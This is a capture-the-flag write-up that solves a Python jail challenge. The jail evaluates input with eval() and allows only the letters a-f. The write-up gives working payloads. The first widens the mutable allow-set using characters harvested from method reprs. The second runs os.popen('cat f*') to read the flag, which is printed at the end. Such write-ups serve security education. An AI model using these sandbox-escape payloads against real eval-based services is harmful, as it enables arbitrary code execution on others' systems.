misc
## Challenge Overview
We are presented with a Python jail (`jail.py`) running on a server. The jail accepts user input and executes it using `eval()`, but enforces an extremely strict character filter via the `is_valid()` function.

### Constraints
1.  **Allowed Characters:** 'a', 'b', 'c', 'd', 'e', 'f' (case-insensitive).
2.  **Allowed Extras:** Digits (0-9) and all printable ASCII symbols (e.g., `_`, `.`, `(`, `)`, `[`, `]`, `{`, `}`).
3.  **Forbidden:** All other alphabetic characters (g-z).
4.  **Escapes:** `\x` escapes are effectively banned because 'x' is a forbidden character.

### The Code
```python
abcdef = set("abcdef")

def is_valid(text):
    for c in text:
        # ... (ascii checks)
        if c.isalpha() and c not in abcdef:
            return False
    return True
# ... loop with input() and eval()
```

## Solution Analysis

The core vulnerability lies in the fact that `abcdef` is a mutable `set` available in the global scope. If we can add characters to this set, the `is_valid` function will allow them in subsequent inputs.

To call `abcdef.add(char)`, we need a reference to the character `char`. Since we cannot type forbidden characters directly, we must "harvest" them from existing objects available in the environment using only allowed syntax.

### Harvesting Characters
We can generate strings containing forbidden characters by taking the representation (`repr` or `str`) of available objects.
*   `abcdef.add` is a built-in method.
*   `f"{abcdef.add}"` evaluates to a string like: `<built-in method add of set object at 0x...>`
*   `(1).__add__` is a method wrapper.
*   `f"{(1).__add__}"` evaluates to a string like: `<method-wrapper '__add__' of int object at 0x...>`

These strings contain the characters `i`, `m`, `p`, `o`, `r`, `t`, `s`, `n` needed to construct `print`, `__import__`, `os`, and `popen`.

By calculating the index of each character in these strings, we can extract them. For example, `f"{abcdef.add}"[3]` is 'i'.

### Step 1: The Jailbreak Payload
We construct a list of `abcdef.add(...)` calls. This payload itself only uses `a-f`, digits, and symbols.

```python
[
    abcdef.add(f"{abcdef.add}"[3]),   # i
    abcdef.add(f"{abcdef.add}"[10]),  # m
    abcdef.add(f"{(1).__add__}"[11]), # p
    abcdef.add(f"{abcdef.add}"[14]),  # o
    abcdef.add(f"{(1).__add__}"[9]),  # r
    abcdef.add(f"{abcdef.add}"[5]),   # t
    abcdef.add(f"{abcdef.add}"[24]),  # s
    abcdef.add(f"{abcdef.add}"[8])    # n
]
```
**Minified Input 1:**
```python
[abcdef.add(f"{abcdef.add}"[3]),abcdef.add(f"{abcdef.add}"[10]),abcdef.add(f"{(1).__add__}"[11]),abcdef.add(f"{abcdef.add}"[14]),abcdef.add(f"{(1).__add__}"[9]),abcdef.add(f"{abcdef.add}"[5]),abcdef.add(f"{abcdef.add}"[24]),abcdef.add(f"{abcdef.add}"[8])]
```

### Step 2: Arbitrary Code Execution
Once the characters are added to `abcdef`, the `is_valid` function allows us to use them. We can now write standard Python code to read the flag. We use `print` because `eval` doesn't display output automatically in this loop.

**Input 2:**
```python
print(__import__('os').popen('cat f*').read())
```

## Flag
`nullctf{g!bb3r!sh_d!dnt_st0p_y0u!}`